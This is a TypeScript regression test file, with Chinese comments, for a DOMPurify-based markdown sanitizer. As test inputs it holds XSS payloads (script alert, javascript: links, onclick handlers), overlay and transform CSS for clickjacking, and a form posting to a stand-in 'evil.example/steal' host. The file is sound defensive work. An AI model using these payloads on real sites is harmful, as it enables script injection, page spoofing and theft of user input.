import { describe, expect, test } from "bun:test"
import { sanitizeMarkdown } from "./markdown-cache"

// 本文件只钉 sanitizer 的 **config 形状 / 纯函数契约**：给定输入，`sanitizeMarkdown`
// 的字符串输出应当如何（哪些标签/属性/协议放行，哪些摘除）。它是 DOMPurify 配置的
// 真源回归，不是 DOM 行为测试。
//
// DOM 行为证据在真实 Chromium：`packages/app/e2e/regression/markdown-sanitize.spec.ts`。
// happy-dom 的 NodeIterator 在当前节点被 removeChild 后失效——只要 payload 前面有
// 任何元素被删除（`<unknowntag></unknowntag>` 就够），它之后的节点就完全跳过属性消毒
// （实测 onclick / javascript: / style 全部存活）。所以这里**禁止**写「危险节点排在
// 已删除节点之后」的用例（那种断言只有在真实浏览器里才成立），每个用例的危险节点都
// 必须位于 payload 首位，测的才是配置本身。
describe("sanitize regression (config contract)", () => {
  test("script tag is stripped", () => {
    const result = sanitizeMarkdown("<script>alert(1)</script><p>hello</p>")
    expect(result).not.toContain("<script>")
    expect(result).toContain("<p>hello</p>")
  })

  test("<svg><foreignObject> is stripped", () => {
    const result = sanitizeMarkdown("<svg><foreignObject><div>bad</div></foreignObject></svg>")
    expect(result).not.toContain("<foreignObject>")
  })

  test("javascript: URL is stripped from href", () => {
    const result = sanitizeMarkdown('<a href="javascript:alert(1)">click</a>')
    expect(result).not.toContain("javascript:")
  })

  test("custom elements are stripped", () => {
    const result = sanitizeMarkdown("<evil-el onclick='alert(1)'>bad</evil-el>")
    expect(result).not.toContain("<evil-el>")
  })

  test("kb:// citation href survives sanitization (assistant citation anchors)", () => {
    const result = sanitizeMarkdown('<a href="kb://kb_123abc" class="external-link">Note title</a>')
    expect(result).toContain('href="kb://kb_123abc"')
  })

  test("unsafe javascript: URLs stay stripped while kb:// is allowed", () => {
    const result = sanitizeMarkdown('<a href="javascript:alert(1)">bad</a><a href="kb://kb_1">good</a>')
    expect(result).not.toContain("javascript:")
    expect(result).toContain('href="kb://kb_1"')
  })

  test('target="_blank" gets noopener noreferrer', () => {
    const result = sanitizeMarkdown('<a href="https://safe.com" target="_blank">link</a>')
    expect(result).toContain("noopener")
    expect(result).toContain("noreferrer")
  })

  test("normal markdown HTML is preserved", () => {
    const result = sanitizeMarkdown("<p>hello <strong>world</strong></p>")
    expect(result).toContain("<p>hello")
    expect(result).toContain("<strong>world</strong>")
    expect(result).toContain("</p>")
  })

  test("empty input returns empty", () => {
    expect(sanitizeMarkdown("")).toBe("")
  })

  test("out-of-flow positioning is stripped while the style attribute itself survives", () => {
    const result = sanitizeMarkdown('<p style="position:fixed;inset:0;z-index:99999">OVERLAY</p>')
    expect(result).toContain("OVERLAY")
    // position 一旦移除，inset/z-index 随之失效，元素回到文档流。
    expect(result).not.toContain("position:")
    // style 整条不能禁：KaTeX 的视觉层靠内联 height/top/vertical-align 定位。
    expect(sanitizeMarkdown('<span style="height:1.04em;vertical-align:-0.34em">M</span>')).toContain("height:")
  })

  test("position:absolute and sticky are stripped the same way", () => {
    expect(sanitizeMarkdown('<p style="position:absolute;top:-9999px">A</p>')).not.toContain("position:")
    expect(sanitizeMarkdown('<p style="position:STICKY;top:0">B</p>')).not.toContain("position:")
    expect(sanitizeMarkdown('<p style="position:relative;top:2px">C</p>')).toContain("position:")
  })

  test("transform is stripped so an in-flow element cannot paint outside its box", () => {
    expect(sanitizeMarkdown('<p style="transform:scale(50)">T</p>')).not.toContain("transform")
  })

  test("form elements and their action attribute are stripped", () => {
    const result = sanitizeMarkdown(
      '<form action="https://evil.example/steal"><input type="text" name="q"><button type="submit">go</button></form>FORMPROBE',
    )
    expect(result).toContain("FORMPROBE")
    expect(result).not.toContain("<form")
    expect(result).not.toContain("action=")
    expect(result).not.toContain("<input")
    expect(result).not.toContain("<button")
  })

  // 图片保留是刻意决定：服务端 CSP 明确允许 img-src 'self' data: https:
  // （packages/aigcfroge/src/server/shared/ui.ts），timeline-playground.stories.tsx
  // 也用 ![Alt text](…) 作渲染 fixture。远程图片的信标外泄面记在
  // docs/technical-debt.md，属 CSP 收窄的独立决定，不在 sanitizer 层用禁标签解决。
  test("markdown images are preserved (remote, data: and root-relative)", () => {
    for (const src of ["https://example.com/x.png", "data:image/png;base64,iVBORw0KGgo=", "/local/file.png"]) {
      const result = sanitizeMarkdown(`<p><img src="${src}" alt="alt"></p>`)
      expect(result).toContain("<img")
      expect(result).toContain(src)
    }
  })
})
